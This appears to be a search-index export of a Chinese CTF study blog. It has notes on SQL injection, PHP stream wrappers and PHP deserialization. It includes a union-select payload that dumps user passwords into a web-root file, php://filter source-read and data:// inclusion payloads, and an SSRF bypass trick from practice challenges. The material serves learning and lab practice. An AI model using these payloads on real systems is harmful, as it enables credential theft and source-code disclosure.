id="CTFShow175"><a href="#CTFShow175" class="headerlink" title="CTFShow175:"></a>CTFShow175:</h2><blockquote><p>‘ union select username, password from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ –+</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/dong.github/2024/09/01/fakeprotocol/"/>
    <url>/dong.github/2024/09/01/fakeprotocol/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>php伪协议整理。</strong></p><span id="more"></span><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span> file:// — 访问本地文件系统<br><span class="hljs-number">2</span> http:// — 访问 <span class="hljs-built_in">HTTP</span>(s) 网址<br><span class="hljs-number">3</span> ftp:// — 访问 <span class="hljs-built_in">FTP</span>(s) URLs<br><span class="hljs-number">4</span> php:// — 访问各个输入/输出流（I/O streams）<br><span class="hljs-number">5</span> zlib:// — 压缩流<br><span class="hljs-number">6</span> data:// — 数据（RFC）<br><span class="hljs-number">7</span> glob:// — 查找匹配的文件路径模式<br><span class="hljs-number">8</span> phar:// — PHP 归档<br><span class="hljs-number">9</span> ssh2:// — Secure Shell <span class="hljs-number">2</span><br><span class="hljs-number">10</span> rar:// — RAR<br><span class="hljs-number">11</span> ogg:// — 音频流<br><span class="hljs-number">12</span> expect:// — 处理交互式的流<br>-----------------------php支持的伪协议-------------------------------------------------------<br></code></pre></td></tr></table></figure><p><strong>PHP的伪协议提供了一种灵活且强大的方式来访问和操作各种类型的资源。通过熟练使用这些伪协议，可以在PHP中实现更多高级和有趣的功能，提升开发效率和应用的功能性。无论是处理网络资源，还是进行高效的数据流操作，了解并掌握PHP的伪协议都将是宝贵的技能之一。</strong></p><p><strong>条件：</strong></p><blockquote><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :off</li></ul></blockquote><ul><li><code>php://input  </code></li><li><code>php://stdin  </code></li><li><code>php://memory </code></li><li><code>php://temp </code></li></ul><p> 需要allow_url_include:on</p><h1 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h1><h2 id="php-filter（用于读取）"><a href="#php-filter（用于读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（用于读取）"></a>php:&#x2F;&#x2F;filter（用于读取）</h2><p>php:&#x2F;&#x2F;filter是一种元封装器，设计用于数据流打开时的筛选过滤使用。</p><p>=&gt;是一个中间件，<strong>在读入或写入数据的时候对数据进行处理后输出</strong></p><blockquote><p><strong>php:filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。</strong></p><p><strong>所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</strong></p></blockquote><p><strong>协议参数:</strong></p><table><thead><tr><th align="left"><strong>名称</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="left">这个参数是必须的，它指定了要过滤的数据流</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">php://filter/read=convert.base64-encode/resource=index.php<br>php://filter/resource=index.php<br></code></pre></td></tr></table></figure><blockquote><p><code>将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</code></p><p><code>而使用的convert.base64-encode，就是一种过滤器。</code></p></blockquote><h2 id="php-input（用于执行）"><a href="#php-input（用于执行）" class="headerlink" title="php:&#x2F;&#x2F;input（用于执行）"></a>php:&#x2F;&#x2F;input（用于执行）</h2><p>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p><h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h1><p><strong>条件：</strong></p><blockquote><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :on</code></li></ul></blockquote><p><strong>数据流封装器，以传递相应格式的数据，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</strong></p><blockquote><ul><li><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</li></ul></blockquote><pre><code class="hljs">data://text/plain,data://text/plain;base64,</code></pre><h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h1><p><strong>file:&#x2F;&#x2F; 协议在双off的情况下也可以正常使用；</strong></p><p><strong>allow_url_fopen ：off&#x2F;on</strong></p><p><strong>allow_url_include：off&#x2F;on</strong></p><blockquote><p>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p></blockquote><h1 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:&#x2F;&#x2F;&amp;https:&#x2F;&#x2F;协议"></a>http:&#x2F;&#x2F;&amp;https:&#x2F;&#x2F;协议</h1><p><strong>条件</strong>：</p><blockquote><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></blockquote><ul><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><pre><code class="hljs">http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com</code></pre></li></ul><h1 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:&#x2F;&#x2F;协议"></a>phar:&#x2F;&#x2F;协议</h1><p>phar:&#x2F;&#x2F;协议类似zip:&#x2F;&#x2F;，同样可以访问zip 格式压缩包内容。</p><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面 (seebug.org)</a></p><h1 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h1><h2 id="2024MoeCTF-ImageCloud前置"><a href="#2024MoeCTF-ImageCloud前置" class="headerlink" title="2024MoeCTF-ImageCloud前置"></a>2024MoeCTF-ImageCloud前置</h2><p><img src="/dong.github/images/0901-3.png" alt="alt text"><br>看到url?&#x3D;，这是一个典型的URL重定向（URL Redirection）漏洞，推测出题人在考察伪协议。<br>结合题目描述，考虑file:&#x2F;&#x2F;，直接读取本地文件，获取flag。</p><h2 id="2024BaseCTF-Aura酱的礼物"><a href="#2024BaseCTF-Aura酱的礼物" class="headerlink" title="2024BaseCTF-Aura酱的礼物"></a>2024BaseCTF-Aura酱的礼物</h2><p><img src="/dong.github/images/0901-4.png" alt="alt text"><br>第一个判断，需要把一个文件当作字符串读入，读入后的字符串等于”Aura”<br>想到data:&#x2F;&#x2F;，两种方法：<br>data:&#x2F;&#x2F;text&#x2F;plain,Aura<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,QXVyYQ&#x3D;&#x3D;</p><p>第二个判断，要求页面开头为<code>http://jasmineaura.github.io</code><br>可以利⽤ @ 来进⾏隔断, 将 @ 前⾯的内容当做⽤⼾名,后面变成了需要转到的地址（SSRF漏洞）。</p><p>第三个的话是⼀个 include 点,flag在php文件的注释部分，使用data协议或其他会让flag.php被执行，无法查看注释。<br>这时就需要使用php:&#x2F;&#x2F;filter：<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>phpfakeprotocol</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/dong.github/2024/09/01/phpserilize/"/>
    <url>/dong.github/2024/09/01/phpserilize/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>php反序列化原理及注入基础。</strong></p><span id="more"></span><p><strong>序列化是对象串行化,对象是一种在内存中存储的数据类型,寿命是随生成该对象的程序的终止而终止,为了持久使用对象的状态,将其通过serialize()函数进行序列化为一行字符串保存为文件,使用时再用unserialize()反序列化为对象。</strong></p><h2 id="序列化举例"><a href="#序列化举例" class="headerlink" title="序列化举例"></a><strong>序列化举例</strong></h2><pre><code class="hljs">数组：a:&lt;length&gt;:&#123;key, value pairs&#125;;a:1:&#123;i:1;s:1:&quot;a&quot;;&#125;对象：O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125;</code></pre><blockquote><p>这部分内容适宜搭建合适的php运行和调试环境学习：</p></blockquote><blockquote><p>环境推荐：小皮面板+sublimetext</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!-- <br><span class="hljs-comment">//序列化：将PHP对象压缩并按照一定格式转换成字符串的过程</span><br><span class="hljs-comment">//反序列化：从字符串转换回PHP对象的过程</span><br><br><span class="hljs-comment">//目的：为了方便PHP对象的传输和存储 --&gt;</span><br>&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span><br>&#123;<br>private $flag = <span class="hljs-string">&#x27;Inactive&#x27;</span>;<br>protected $test = <span class="hljs-string">&quot;test&quot;</span>;<br>public $test1 = <span class="hljs-string">&quot;test1&quot;</span>;<br><br>public <span class="hljs-keyword">function</span> <span class="hljs-title function_">set_flag</span>(<span class="hljs-params">$flag</span>)<br>&#123;<br>$this-&gt;flag = $flag;<br><br>&#125;<br>public <span class="hljs-keyword">function</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params"></span>)<br>&#123;<br><span class="hljs-keyword">return</span> $this-&gt;flag;<br>&#125;<br>&#125;<br>$object = <span class="hljs-keyword">new</span> <span class="hljs-title function_">test</span>();<br>$object-&gt;<span class="hljs-title function_">set_flag</span>(<span class="hljs-string">&#x27;Active&#x27;</span>);<br>$data = <span class="hljs-title function_">serialize</span>($object);<br>echo $data;<br>echo <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>#<span class="hljs-attr">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;testflag&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Active&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;*test&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test1&quot;</span>;&#125;<br>echo <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>?&gt;<br><br><span class="hljs-comment">//unserialize()接收的参数用户可控，传入构造的字符串，实现攻击</span><br><span class="hljs-comment">//只序列化属性，不序列化方法</span><br><span class="hljs-comment">//寻找合适的能够被控制的属性，利用本身存在的方法</span><br><br>&lt;!--只要在魔术方法中存在能利用的函数<br>对这个对象的属性做特殊的操控<br>进而影响这些函数的调用逻辑<br><span class="hljs-number">1</span>&gt;<span class="hljs-title function_">__construct</span>()<br><span class="hljs-number">2</span>&gt;<span class="hljs-title function_">__sleep</span>()<br><span class="hljs-number">3</span>&gt;<span class="hljs-title function_">__wakeup</span>()<br><span class="hljs-number">4</span>&gt;<span class="hljs-title function_">__destruct</span>()<br><span class="hljs-number">5</span>&gt;<span class="hljs-title function_">__toString</span>()把对象当作字符串使用时<br><span class="hljs-number">6</span>&gt;<span class="hljs-title function_">__invoke</span>()把对象当函数使用时<br><span class="hljs-number">7</span>&gt;<span class="hljs-title function_">__call</span>()调用对象不存在的方法的时候 <br>--&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>phpunserilize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
